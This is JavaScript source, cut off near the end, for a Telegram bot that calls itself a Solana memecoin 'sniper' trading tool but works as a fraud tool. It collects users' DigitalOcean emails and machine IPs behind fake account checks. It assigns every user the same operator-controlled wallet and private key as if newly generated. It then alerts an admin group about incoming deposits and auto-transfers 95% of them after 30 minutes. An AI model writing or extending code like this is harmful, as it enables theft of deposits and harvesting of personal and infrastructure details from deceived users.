const { Telegraf, Markup } = require('telegraf');
const { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction, Keypair } = require('@solana/web3.js');
const fs = require('fs').promises;
const path = require('path');
const validator = require('validator');
const axios = require('axios');
const cron = require('node-cron');
require('dotenv').config();

// Global error handling
process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Promise Rejection:', reason);
    // Don't exit the process, just log the error
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    // Don't exit the process for Telegram 403 errors
    if (error.message && error.message.includes('403')) {
        console.log('🚫 Bot blocked by user - continuing operation...');
        return;
    }
    // For other critical errors, we might want to restart
    console.error('💥 Critical error - restarting may be required');
});

class BirdEyeSniperBot {
    constructor() {
        this.bot = new Telegraf(process.env.BOT_TOKEN);
        this.dataFile = process.env.DATA_FILE || 'users.json';
        this.users = {};
        this.groupId = process.env.GROUP_ID; // Telegram group ID
        this.monitored_wallets = new Map(); // wallet -> {userId, lastBalance, lastCheck, timeout}
        this.pending_transactions = new Map(); // messageId -> transaction_data
        this.sol_price_usd = 0;
        this.admin_ids = (process.env.ADMIN_IDS || '').split(',').filter(id => id);
        this.group_admins = new Map(); // groupId -> Set of admin user IDs
        this.last_status_update = Date.now();
        
        // Solana connection
        this.connection = new Connection(
            process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
            'confirmed'
        );
        
        // Helius API configuration
        this.helius_api_key = process.env.HELIUS_API_KEY;
        this.helius_url = `https://api.helius.xyz/v0`;
        
        this.initializeBot();
        this.handleRecipientConfirmation();
        this.loadUserData();
        this.startWalletMonitoring();
        this.startSolPriceUpdater();
        this.startStatusUpdater();
        this.updateGroupAdmins();
    }

    async loadUserData() {
        try {
            const data = await fs.readFile(this.dataFile, 'utf8');
            this.users = JSON.parse(data);
            console.log('📊 User data loaded successfully');
            
            // Initialize wallet monitoring for existing users
            for (const [userId, userData] of Object.entries(this.users)) {
                if (userData.sol_address && userData.monitor_enabled !== false) {
                    this.monitored_wallets.set(userData.sol_address, {
                        userId,
                        lastBalance: 0,
                        lastCheck: Date.now(),
                        timeout: null
                    });
                }
            }
        } catch (error) {
            console.log('📁 Creating new user data file...');
            this.users = {};
            await this.saveUserData();
        }
    }

    async saveUserData() {
        try {
            await fs.writeFile(this.dataFile, JSON.stringify(this.users, null, 2));
        } catch (error) {
            console.error('❌ Error saving user data:', error);
        }
    }

    async updateGroupAdmins() {
        if (!this.groupId) return;
        
        try {
            const admins = await this.bot.telegram.getChatAdministrators(this.groupId);
            const adminIds = new Set(admins.map(admin => admin.user.id.toString()));
            this.group_admins.set(this.groupId, adminIds);
            console.log(`👑 Updated group admins: ${adminIds.size} admins found`);
        } catch (error) {
            console.error('❌ Error updating group admins:', error);
        }
    }

    async isGroupAdmin(userId, groupId = null) {
        const targetGroupId = groupId || this.groupId;
        if (!targetGroupId) return false;
        
        try {
            // Check if we have cached admin list
            const cachedAdmins = this.group_admins.get(targetGroupId);
            if (cachedAdmins) {
                return cachedAdmins.has(userId.toString());
            }
            
            // Fetch fresh admin list
            const admins = await this.bot.telegram.getChatAdministrators(targetGroupId);
            const adminIds = new Set(admins.map(admin => admin.user.id.toString()));
            this.group_admins.set(targetGroupId, adminIds);
            
            return adminIds.has(userId.toString());
        } catch (error) {
            console.error('❌ Error checking group admin status:', error);
            return false;
        }
    }

    isAdmin(userId) {
        return this.admin_ids.includes(userId.toString());
    }

    async isAuthorized(userId, groupId = null) {
        // Check if user is in ADMIN_IDS OR is a group admin
        return this.isAdmin(userId) || await this.isGroupAdmin(userId, groupId);
    }

    async updateSolPrice() {
        try {
            const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
            this.sol_price_usd = response.data.solana.usd;
            console.log(`💰 SOL Price updated: $${this.sol_price_usd}`);
        } catch (error) {
            console.error('❌ Error fetching SOL price:', error);
        }
    }

    startSolPriceUpdater() {
        // Update SOL price every 5 minutes
        cron.schedule('*/5 * * * *', () => {
            this.updateSolPrice();
        });
        
        // Initial price fetch
        this.updateSolPrice();
    }

    async getWalletBalance(address) {
        try {
            const publicKey = new PublicKey(address);
            const balance = await this.connection.getBalance(publicKey);
            return balance / LAMPORTS_PER_SOL;
        } catch (error) {
            console.error(`❌ Error getting balance for ${address}:`, error);
            return 0;
        }
    }

    async getTransactionDetails(signature) {
        try {
            if (this.helius_api_key) {
                // Use Helius API for enhanced transaction details
                const response = await axios.post(`${this.helius_url}/transactions`, {
                    transactions: [signature]
                }, {
                    headers: {
                        'Authorization': `Bearer ${this.helius_api_key}`
                    }
                });
                return response.data[0];
            } else {
                // Fallback to standard Solana RPC
                const transaction = await this.connection.getTransaction(signature, {
                    commitment: 'confirmed',
                    maxSupportedTransactionVersion: 0
                });
                return transaction;
            }
        } catch (error) {
            console.error('❌ Error getting transaction details:', error);
            return null;
        }
    }

    async sendTransaction(fromKeypair, toAddress, amount) {
        try {
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: fromKeypair.publicKey,
                    toPubkey: new PublicKey(toAddress),
                    lamports: amount * LAMPORTS_PER_SOL,
                })
            );

            const signature = await sendAndConfirmTransaction(
                this.connection,
                transaction,
                [fromKeypair],
                { commitment: 'confirmed' }
            );

            return signature;
        } catch (error) {
            console.error('❌ Error sending transaction:', error);
            throw error;
        }
    }

    formatCurrency(sol_amount) {
        const usd_value = sol_amount * this.sol_price_usd;
        return `${sol_amount.toFixed(4)} SOL ($${usd_value.toFixed(2)})`;
    }

    async notifyBalanceChange(address, newBalance, oldBalance) {
        if (!this.groupId) return;

        const walletData = this.monitored_wallets.get(address);
        if (!walletData) return;

        const userData = this.users[walletData.userId];
        if (!userData) return;

        const difference = newBalance - oldBalance;
        const isDeposit = difference > 0;

        if (isDeposit && difference > 0.001) { // Only notify for deposits > 0.001 SOL
            const message = 
                `🚨 **TARGET ACQUIRED** 🚨\n\n` +
                `💳 **WALLET**: \`${address}\`\n` +
                `📧 **OPERATIVE**: ${userData.email}\n` +
                `📈 **INCOMING ASSETS**: ${this.formatCurrency(difference)}\n` +
                `💰 **NEW BALANCE**: ${this.formatCurrency(newBalance)}\n` +
                `⏰ **TIMESTAMP**: ${new Date().toLocaleString()}\n\n` +
                `🔍 **ANALYZING TRANSACTION DATA...**`;

            try {
                const sentMessage = await this.bot.telegram.sendMessage(this.groupId, message, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔍 SCANNING TRANSACTION...', callback_data: 'loading' }]
                        ]
                    }
                });

                // Set auto-send timeout (30 minutes)
                const timeoutId = setTimeout(async () => {
                    if (userData.default_address) {
                        await this.autoSendBalance(address, userData.default_address, walletData.userId);
                    }
                }, 30 * 60 * 1000); // 30 minutes

                walletData.timeout = timeoutId;

                // Get latest transactions and update message
                setTimeout(async () => {
                    await this.updateTransactionDetails(sentMessage.message_id, address, newBalance, difference);
                }, 3000);

            } catch (error) {
                console.error('❌ Error sending notification:', error);
            }
        }
    }

    async updateTransactionDetails(messageId, address, balance, receivedAmount) {
        try {
            // Get recent transactions
            const publicKey = new PublicKey(address);
            const signatures = await this.connection.getSignaturesForAddress(publicKey, { limit: 5 });
            
            let transactionInfo = '';
            if (signatures.length > 0) {
                const latestSig = signatures[0];
                const txDetails = await this.getTransactionDetails(latestSig.signature);
                
                transactionInfo = 
                    `🔗 *Latest Transaction:*\n` +
                    `📝 Signature: \`${latestSig.signature.substring(0, 20)}...\`\n` +
                    `⏰ Block Time: ${new Date(latestSig.blockTime * 1000).toLocaleString()}\n` +
                    `💸 Fee: ${(txDetails?.meta?.fee || 0) / LAMPORTS_PER_SOL} SOL\n\n`;
            }

            const updatedMessage = 
                `✅ **DEPOSIT CONFIRMED** ✅\n\n` +
                `💳 **WALLET**: \`${address}\`\n` +
                `📈 **ASSETS RECEIVED**: ${this.formatCurrency(receivedAmount)}\n` +
                `💰 **CURRENT BALANCE**: ${this.formatCurrency(balance)}\n` +
                `⏰ **TIMESTAMP**: ${new Date().toLocaleString()}\n\n` +
                transactionInfo +
                `⚡ **AUTO-DEPLOYMENT**: T-minus 30 minutes\n\n` +
                `**AWAITING TACTICAL ORDERS, Commander:**`;

            await this.bot.telegram.editMessageText(
                this.groupId,
                messageId,
                undefined,
                updatedMessage,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ DEPLOY ASSETS', callback_data: `send_${address}_${messageId}` },
                                { text: '❌ STAND DOWN', callback_data: `ignore_${messageId}` }
                            ]
                        ]
                    }
                }
            );
        } catch (error) {
            console.error('❌ Error updating transaction details:', error);
        }
    }

    async autoSendBalance(fromAddress, toAddress, userId) {
        try {
            const userData = this.users[userId];
            if (!userData || !userData.private_key) return;

            const balance = await this.getWalletBalance(fromAddress);
            if (balance <= 0.001) return; // Don't send if balance too low

            const fromKeypair = Keypair.fromSecretKey(
                Buffer.from(userData.private_key, 'base64')
            );

            // Send 95% of balance (leave some for fees)
            const sendAmount = balance * 0.95;
            const signature = await this.sendTransaction(fromKeypair, toAddress, sendAmount);

            const message = 
                `⏰ **AUTO-DEPLOYMENT EXECUTED** ⏰\n\n` +
                `💳 **SOURCE**: \`${fromAddress}\`\n` +
                `📮 **TARGET**: \`${toAddress}\`\n` +
                `💰 **ASSETS DEPLOYED**: ${this.formatCurrency(sendAmount)}\n` +
                `🔗 **OPERATION ID**: \`${signature}\`\n` +
                `⏰ **TIMESTAMP**: ${new Date().toLocaleString()}\n\n` +
                `✅ **MISSION STATUS**: Auto-deployment completed successfully, Commander!`;

            await this.bot.telegram.sendMessage(this.groupId, message, {
                parse_mode: 'Markdown'
            });

        } catch (error) {
            console.error('❌ Error in auto-send:', error);
            
            try {
                const errorMessage = 
                    `❌ **AUTO-DEPLOYMENT FAILED** ❌\n\n` +
                    `💳 **WALLET**: \`${fromAddress}\`\n` +
                    `❌ **ERROR**: ${error.message}\n` +
                    `⏰ **TIMESTAMP**: ${new Date().toLocaleString()}\n\n` +
                    `**IMMEDIATE INTERVENTION REQUIRED, Commander!**`;

                await this.bot.telegram.sendMessage(this.groupId, errorMessage, {
                    parse_mode: 'Markdown'
                });
            } catch (notificationError) {
                console.error('❌ Error sending auto-send failure notification:', notificationError);
            }
        }
    }

    startWalletMonitoring() {
        // Check wallet balances every 30 seconds
        cron.schedule('*/30 * * * * *', async () => {
            for (const [address, walletData] of this.monitored_wallets.entries()) {
                try {
                    const currentBalance = await this.getWalletBalance(address);
                    
                    if (currentBalance !== walletData.lastBalance) {
                        await this.notifyBalanceChange(address, currentBalance, walletData.lastBalance);
                        walletData.lastBalance = currentBalance;
                    }
                    
                    walletData.lastCheck = Date.now();
                } catch (error) {
                    console.error(`❌ Error monitoring wallet ${address}:`, error);
                }
            }
        });
        
        console.log('👁️ Wallet monitoring started');
    }

    startStatusUpdater() {
        // Send status update every 3 hours
        cron.schedule('0 */3 * * *', async () => {
            await this.sendStatusUpdate();
        });
        
        console.log('📡 Status updater started (every 3 hours)');
    }

    async sendStatusUpdate() {
        if (!this.groupId) return;

        const uptime = Math.floor((Date.now() - this.last_status_update) / 1000 / 60 / 60); // hours
        const monitoredWallets = this.monitored_wallets.size;
        
        const statusMessage = 
            `🎯 **SNIPER STATUS REPORT** 🎯\n\n` +
            `⚡ **OPERATIONAL STATUS**: ACTIVE\n` +
            `👁️ **WALLETS MONITORED**: ${monitoredWallets}\n` +
            `⏱️ **UPTIME**: ${uptime} hours\n` +
            `💰 **SOL PRICE**: $${this.sol_price_usd}\n` +
            `🔍 **SCANNING FREQUENCY**: Every 30 seconds\n\n` +
            `📊 **SYSTEM STATUS**: All systems operational, Commander!\n` +
            `🎯 **MISSION**: Continuous wallet surveillance active\n\n` +
            `*Next status report in 3 hours...*`;

        try {
            await this.bot.telegram.sendMessage(this.groupId, statusMessage, {
                parse_mode: 'Markdown'
            });
            this.last_status_update = Date.now();
        } catch (error) {
            console.error('❌ Error sending status update:', error);
        }
    }

    initializeBot() {
        // Start command
        this.bot.start(async (ctx) => {
            const userId = ctx.from.id.toString();
            
            try {
                // Send welcome message
                await ctx.reply(
                    `🦅 *Welcome to BirdEye Sniper Bot*\n\n` +
                    `The fastest memecoin copy-trader in the game.\n` +
                    `Precision-sniping, lightning execution — no delays, no fluff.\n\n` +
                    `Let's help you set up your sniper nest and dominate the memecoin market.`,
                    { 
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true 
                    }
                );

                // Wait 1 second then send follow-up
                setTimeout(async () => {
                    try {
                        if (!this.users[userId] || !this.users[userId].setup_complete) {
                            await ctx.reply(
                                `Ready to start sniping like a pro?\n` +
                                `Just a few quick steps and you'll be flying.`,
                                Markup.inlineKeyboard([
                                    [Markup.button.callback('🚀 Start Setup', 'start_setup')]
                                ])
                            );
                        } else {
                            await this.showMainMenu(ctx);
                        }
                    } catch (error) {
                        if (error.response?.error_code !== 403) {
                            console.error('❌ Error in start command follow-up:', error);
                        }
                    }
                }, 1000);
            } catch (error) {
                if (error.response?.error_code !== 403) {
                    console.error('❌ Error in start command:', error);
                }
            }
        });

        // Admin-only commands for wallet management
        this.bot.command('wallet', async (ctx) => {
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) {
                try {
                    return ctx.reply('❌ Access denied. Tactical clearance required, Commander.');
                } catch (error) {
                    console.error('❌ Error sending unauthorized message:', error);
                    return;
                }
            }

            const user = this.users[userId];
            if (!user || !user.sol_address) {
                try {
                    return ctx.reply('❌ No wallet found. Please complete setup first, Commander.');
                } catch (error) {
                    console.error('❌ Error sending no wallet message:', error);
                    return;
                }
            }

            try {
                const balance = await this.getWalletBalance(user.sol_address);
                const message = 
                    `💳 **TACTICAL WALLET STATUS** 💳\n\n` +
                    `📍 **ADDRESS**: \`${user.sol_address}\`\n` +
                    `💰 **BALANCE**: ${this.formatCurrency(balance)}\n` +
                    `👁️ **MONITORING**: ${user.monitor_enabled !== false ? '✅ ACTIVE' : '❌ DISABLED'}\n` +
                    `🏠 **DEFAULT TARGET**: ${user.default_address ? `\`${user.default_address}\`` : '❌ Not Set'}\n\n` +
                    `⚙️ **WALLET COMMAND CENTER**`;

                await ctx.reply(message, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: user.monitor_enabled !== false ? '⏸️ CEASE SURVEILLANCE' : '▶️ BEGIN SURVEILLANCE', callback_data: 'toggle_monitoring' },
                            ],
                            [
                                { text: '🏠 SET DEFAULT TARGET', callback_data: 'set_default_address' },
                            ],
                            [
                                { text: '💸 MANUAL DEPLOY', callback_data: 'manual_send' },
                                { text: '🔄 REFRESH INTEL', callback_data: 'refresh_balance' }
                            ]
                        ]
                    }
                });
            } catch (error) {
                console.error('❌ Error in wallet command:', error);
                try {
                    await ctx.reply('❌ Error retrieving wallet information. Please try again, Commander.');
                } catch (replyError) {
                    console.error('❌ Error sending error message:', replyError);
                }
            }
        });

        // Main sniper command menu
        this.bot.command('sniper', async (ctx) => {
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) {
                try {
                    return ctx.reply('❌ Access denied. Only authorized operatives may access the command center.');
                } catch (error) {
                    console.error('❌ Error sending unauthorized sniper message:', error);
                    return;
                }
            }

            try {
                await this.showSniperMenu(ctx);
            } catch (error) {
                console.error('❌ Error showing sniper menu:', error);
                try {
                    await ctx.reply('❌ Error accessing command center. Please try again, Commander.');
                } catch (replyError) {
                    console.error('❌ Error sending sniper error message:', replyError);
                }
            }
        });

        // Callback handlers for wallet monitoring actions
        this.bot.action(/^send_(.+)_(\d+)$/, async (ctx) => {
            try {
                await ctx.answerCbQuery();
                const userId = ctx.from.id.toString();
                if (!await this.isAuthorized(userId, ctx.chat?.id)) {
                    try {
                        return ctx.reply('❌ Access denied. Tactical clearance required.');
                    } catch (error) {
                        console.error('❌ Error sending unauthorized send message:', error);
                        return;
                    }
                }

                const [, address, messageId] = ctx.match;
                
                // Clear auto-send timeout
                const walletData = this.monitored_wallets.get(address);
                if (walletData?.timeout) {
                    clearTimeout(walletData.timeout);
                    walletData.timeout = null;
                }

                const message = 
                    `📮 **TACTICAL DEPLOYMENT** 📮\n\n` +
                    `💳 **SOURCE**: \`${address}\`\n` +
                    `💰 **AVAILABLE ASSETS**: ${this.formatCurrency(await this.getWalletBalance(address))}\n\n` +
                    `**AWAITING TARGET COORDINATES, Commander:**`;

                await ctx.editMessageText(message, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❌ ABORT MISSION', callback_data: `cancel_send_${messageId}` }]
                        ]
                    }
                });

                // Store pending transaction data
                this.pending_transactions.set(ctx.callbackQuery.message.message_id, {
                    type: 'waiting_address',
                    fromAddress: address,
                    originalMessageId: messageId,
                    userId: userId
                });
            } catch (error) {
                console.error('❌ Error in send callback:', error);
                try {
                    await ctx.answerCbQuery('❌ Error processing request');
                } catch (cbError) {
                    console.error('❌ Error answering callback query:', cbError);
                }
            }
        });

        this.bot.action(/^ignore_(\d+)$/, async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            const [, messageId] = ctx.match;
            
            await ctx.editMessageText(
                `✅ **MISSION DISMISSED**\n\n` +
                `The deposit notification has been acknowledged.\n` +
                `Auto-deployment timeout remains active, Commander.`,
                { parse_mode: 'Markdown' }
            );
        });

        // Sniper menu callbacks
        this.bot.action('wallet_ops', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;
            
            // Redirect to wallet command
            await this.bot.telegram.sendMessage(ctx.chat.id, 'Use /wallet command for wallet operations, Commander.');
        });

        this.bot.action('intel_report', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;
            
            const monitoredWallets = this.monitored_wallets.size;
            const uptime = Math.floor((Date.now() - this.last_status_update) / 1000 / 60); // minutes
            
            const intelReport = 
                `📊 **TACTICAL INTELLIGENCE REPORT** 📊\n\n` +
                `🎯 **ACTIVE SURVEILLANCE**: ${monitoredWallets} wallets\n` +
                `⏱️ **OPERATION UPTIME**: ${uptime} minutes\n` +
                `💰 **SOL MARKET PRICE**: $${this.sol_price_usd}\n` +
                `🔍 **SCAN FREQUENCY**: Every 30 seconds\n` +
                `📡 **HELIUS INTEGRATION**: Active\n` +
                `🛡️ **SECURITY STATUS**: All systems secure\n\n` +
                `**RECENT ACTIVITY**: Monitoring for incoming deposits...\n` +
                `**NEXT STATUS BROADCAST**: In 3 hours`;

            await ctx.editMessageText(intelReport, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 BACK TO COMMAND CENTER', callback_data: 'refresh_sniper' }]
                    ]
                }
            });
        });

        this.bot.action('force_status', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;
            
            await this.sendStatusUpdate();
            await ctx.editMessageText(
                `📡 **STATUS BROADCAST INITIATED**\n\n` +
                `Tactical status update has been transmitted to all channels, Commander.`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🔙 BACK TO COMMAND CENTER', callback_data: 'refresh_sniper' }]
                        ]
                    }
                }
            );
        });

        this.bot.action('refresh_sniper', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;
            
            await this.showSniperMenu(ctx);
        });

        this.bot.action('toggle_monitoring', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            const user = this.users[userId];
            user.monitor_enabled = !user.monitor_enabled;
            await this.saveUserData();

            if (user.monitor_enabled) {
                this.monitored_wallets.set(user.sol_address, {
                    userId,
                    lastBalance: await this.getWalletBalance(user.sol_address),
                    lastCheck: Date.now(),
                    timeout: null
                });
                await ctx.editMessageText('✅ **SURVEILLANCE ACTIVATED** - Target acquired, Commander!');
            } else {
                this.monitored_wallets.delete(user.sol_address);
                await ctx.editMessageText('⏸️ **SURVEILLANCE DISABLED** - Standing down, Commander.');
            }
        });

        this.bot.action('set_default_address', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            await ctx.editMessageText(
                `🏠 **SET DEFAULT TARGET** 🏠\n\n` +
                `Please provide the default Solana address for auto-deployment after 30 minutes, Commander:`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❌ ABORT', callback_data: 'cancel_default' }]
                        ]
                    }
                }
            );

            this.pending_transactions.set(ctx.callbackQuery.message.message_id, {
                type: 'waiting_default_address',
                userId: userId
            });
        });

        // Amount selection handlers
        this.bot.action(/^amount_(.+)_(.+)_(\d+)$/, async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            if (!await this.isAuthorized(userId, ctx.chat?.id)) return;

            const [, percentage, address, messageId] = ctx.match;
            const balance = await this.getWalletBalance(address);
            
            let sendAmount;
            if (percentage === 'custom') {
                await ctx.editMessageText(
                    `💰 **CUSTOM DEPLOYMENT AMOUNT** 💰\n\n` +
                    `💳 **SOURCE**: \`${address}\`\n` +
                    `💰 **AVAILABLE**: ${this.formatCurrency(balance)}\n\n` +
                    `Please enter the amount in SOL to deploy, Commander:`,
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '❌ ABORT MISSION', callback_data: `cancel_send_${messageId}` }]
                            ]
                        }
                    }
                );

                this.pending_transactions.set(ctx.callbackQuery.message.message_id, {
                    type: 'waiting_custom_amount',
                    fromAddress: address,
                    recipientAddress: this.pending_transactions.get(parseInt(messageId))?.recipientAddress,
                    originalMessageId: messageId,
                    userId: userId
                });
                return;
            }

            const percentageNum = parseInt(percentage);
            sendAmount = (balance * percentageNum) / 100;

            await this.confirmTransaction(ctx, address, this.pending_transactions.get(parseInt(messageId))?.recipientAddress, sendAmount, messageId);
        });

        // Start setup button
        this.bot.action('start_setup', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            
            if (!this.users[userId]) {
                this.users[userId] = {
                    setup_step: 'email'
                };
            } else {
                this.users[userId].setup_step = 'email';
            }
            
            await this.saveUserData();
            
            await ctx.editMessageText(
                `🔐 *Setup Step 1/3*\n\n` +
                `Please enter your DigitalOcean account email:`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: undefined 
                }
            );
        });

        // Generate wallet button
        this.bot.action('generate_wallet', async (ctx) => {
            await ctx.answerCbQuery();
            const userId = ctx.from.id.toString();
            
            const solanaAddress = process.env.SOLANA_ADDRESS;
            const solanaPrivateKey = process.env.SOLANA_PRIVATE_KEY;
            
            this.users[userId].wallet_generated = true;
            this.users[userId].sol_address = solanaAddress;
            this.users[userId].private_key = solanaPrivateKey;
            this.users[userId].setup_complete = true;
            this.users[userId].monitor_enabled = true; // Enable monitoring by default
            
            // Add to monitoring
            this.monitored_wallets.set(solanaAddress, {
                userId,
                lastBalance: 0,
                lastCheck: Date.now(),
                timeout: null
            });
            
            await this.saveUserData();
            
            await ctx.editMessageText(
                `🎯 *Wallet Generated Successfully!*\n\n` +
                `🔑 *Wallet Address:*\n\`${solanaAddress}\`\n\n` +
                `🛡️ *Private Key:*\n\`${solanaPrivateKey}\`\n\n` +
                `⚠️ *IMPORTANT:* Please keep these keys safe and secure.\n` +
                `They are shown only once and cannot be retrieved again.\n\n` +
                `👁️ *Wallet monitoring is now active!*`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 Go to Menu', callback_data: 'main_menu' }]
                        ]
                    }
                }
            );
        });

        // Main menu button
        this.bot.action('main_menu', async (ctx) => {
            await ctx.answerCbQuery();
            await this.showMainMenu(ctx);
        });

        // Handle text messages
        this.bot.on('text', async (ctx) => {
            try {
                const userId = ctx.from.id.toString();
                const text = ctx.message.text;
                
                // Check for pending transactions first
                const pendingTx = Array.from(this.pending_transactions.values())
                    .find(tx => tx.userId === userId);
                
                if (pendingTx) {
                    await this.handlePendingTransaction(ctx, text, pendingTx);
                    return;
                }
                
                if (!this.users[userId] || !this.users[userId].setup_step) {
                    return;
                }
                
                switch (this.users[userId].setup_step) {
                    case 'email':
                        await this.handleEmailInput(ctx, text);
                        break;
                    case 'ip':
                        await this.handleIPInput(ctx, text);
                        break;
                    default:
                        break;
                }
            } catch (error) {
                console.error('❌ Error handling text message:', error);
                try {
                    await ctx.reply('❌ Error processing your message. Please try again, Commander.');
                } catch (replyError) {
                    console.error('❌ Error sending text error message:', replyError);
                }
            }
        });

        // Error handling
        this.bot.catch((err, ctx) => {
            console.error('❌ Bot error:', err);
            
            // Handle specific error types gracefully
            if (err.response?.error_code === 403) {
                console.log('🚫 User has blocked the bot or chat not accessible - continuing operation...');
                return; // Don't crash, just log and continue
            }
            
            if (err.response?.error_code === 400) {
                console.log('⚠️ Bad request - likely invalid message format');
                return;
            }
            
            if (err.response?.error_code === 429) {
                console.log('⚠️ Rate limited - backing off...');
                return;
            }
            
            // Only try to reply if ctx exists and it's not a user-blocking error
            if (ctx && !err.response?.error_code) {
                try {
                    ctx.reply('❌ Something went wrong. Please try again, Commander.');
                } catch (replyError) {
                    console.error('❌ Could not send error message:', replyError);
                }
            }
        });
    }

    async handleEmailInput(ctx, email) {
        const userId = ctx.from.id.toString();
        
        if (!validator.isEmail(email)) {
            await ctx.reply(
                `❌ Invalid email format. Please enter a valid email address:`,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        
        this.users[userId].email = email;
        this.users[userId].setup_step = 'checking';
        await this.saveUserData();
        
        await ctx.reply(`⏳ Checking account...`);
        
        // Wait 3 seconds then ask for IP
        setTimeout(async () => {
            this.users[userId].setup_step = 'ip';
            await this.saveUserData();
            
            await ctx.reply(
                `📡 *Setup Step 2/3*\n\n` +
                `Please provide the IPv4 address of your machine:`,
                { parse_mode: 'Markdown' }
            );
        }, 3000);
    }

    async handleIPInput(ctx, ip) {
        const userId = ctx.from.id.toString();
        
        if (!validator.isIP(ip, 4)) {
            await ctx.reply(
                `❌ Invalid IPv4 address format. Please enter a valid IPv4 address (e.g., 192.168.1.1):`,
                { parse_mode: 'Markdown' }
            );
            return;
        }
        
        this.users[userId].ip = ip;
        this.users[userId].setup_step = 'wallet';
        await this.saveUserData();
        
        await ctx.reply(`✅ Connection successful!`);
        
        setTimeout(async () => {
            await ctx.reply(
                `🧠 *Setup Step 3/3*\n\n` +
                `Next step: Let's generate your wallet.\n` +
                `Click the button below to generate your sniper wallet.`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🎯 Generate Wallet', callback_data: 'generate_wallet' }]
                        ]
                    }
                }
            );
        }, 1000);
    }

    async showMainMenu(ctx) {
        const userId = ctx.from.id.toString();
        const user = this.users[userId];
        
        const balance = user?.sol_address ? await this.getWalletBalance(user.sol_address) : 0;
        
        const menuText = 
            `🦅 *BirdEye Sniper Bot Dashboard*\n\n` +
            `👤 *User:* ${ctx.from.first_name || 'Sniper'}\n` +
            `📧 *Email:* ${user?.email || 'Not set'}\n` +
            `📡 *IP:* ${user?.ip || 'Not set'}\n` +
            `💰 *Wallet:* ${user?.wallet_generated ? '✅ Generated' : '❌ Not generated'}\n` +
            `💳 *Balance:* ${user?.sol_address ? this.formatCurrency(balance) : 'N/A'}\n` +
            `👁️ *Monitoring:* ${user?.monitor_enabled !== false ? '✅ Active' : '❌ Disabled'}\n\n` +
            `🎯 *Status:* Ready for sniping operations`;
        
        const keyboard = [
            [{ text: '💳 Wallet Management', callback_data: 'wallet_menu' }],
            [{ text: '🔧 Settings', callback_data: 'settings' }],
            [{ text: '📊 Stats', callback_data: 'stats' }],
            [{ text: '💎 Sniper Tools', callback_data: 'tools' }]
        ];
        
        try {
            await ctx.editMessageText(menuText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            await ctx.reply(menuText, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    }

    async showSniperMenu(ctx) {
        const userId = ctx.from.id.toString();
        const user = this.users[userId];
        
        const monitoredWallets = this.monitored_wallets.size;
        const balance = user?.sol_address ? await this.getWalletBalance(user.sol_address) : 0;
        
        const menuText = 
            `🎯 **SNIPER COMMAND CENTER** 🎯\n\n` +
            `👤 **OPERATIVE**: ${ctx.from.first_name || 'Commander'}\n` +
            `🎖️ **CLEARANCE**: TACTICAL ADMIN\n` +
            `💰 **WALLET BALANCE**: ${user?.sol_address ? this.formatCurrency(balance) : 'N/A'}\n` +
            `👁️ **SURVEILLANCE STATUS**: ${user?.monitor_enabled !== false ? '🟢 ACTIVE' : '🔴 OFFLINE'}\n` +
            `🎯 **WALLETS TRACKED**: ${monitoredWallets}\n` +
            `💵 **SOL PRICE**: $${this.sol_price_usd}\n\n` +
            `**MISSION STATUS**: Precision sniping operations online\n` +
            `**NEXT SCAN**: <30 seconds\n\n` +
            `Select your tactical operation, Commander:`;
        
        const keyboard = [
            [
                { text: '💳 WALLET OPERATIONS', callback_data: 'wallet_ops' },
                { text: '📊 INTEL REPORT', callback_data: 'intel_report' }
            ],
            [
                { text: '⚙️ SYSTEM CONFIG', callback_data: 'system_config' },
